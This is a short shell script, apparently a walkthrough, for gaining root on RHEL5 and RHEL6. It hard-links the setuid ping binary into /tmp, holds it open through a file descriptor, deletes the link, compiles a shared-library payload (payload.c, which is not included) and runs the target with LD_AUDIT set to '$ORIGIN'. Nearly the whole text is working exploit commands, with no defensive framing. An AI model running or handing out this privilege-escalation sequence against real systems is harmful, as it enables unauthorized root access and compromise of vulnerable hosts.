#!/bin/sh

# suid-up2root in RHEL5 - RHEL6

# create 
useradd mk

# swap to mk
su - mk

# check who you are
whoami

#drwxrwxrwt 8 root root 4096 Jun  2 23:34 /tmp/
ll -d /tmp

# suid-up2root
# s for suid
# -rwsr-xr-x 1 root root 44168 May  8  2014 /bin/ping*
ll /bin/ping

cd /tmp/
mkdir exploit
ln /bin/ping /tmp/exploit/target

ll !$

exec 3< /tmp/exploit/target

# $$ current process
ll /proc/$$/fd/3

rm -rf /tmp/exploit

# no link
ll /proc/$$/fd/3

# used check user uid,gid
id root

gcc -w -fPIC -shared -o /tmp/exploit payload.c

ll /tmp/exploit

LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3


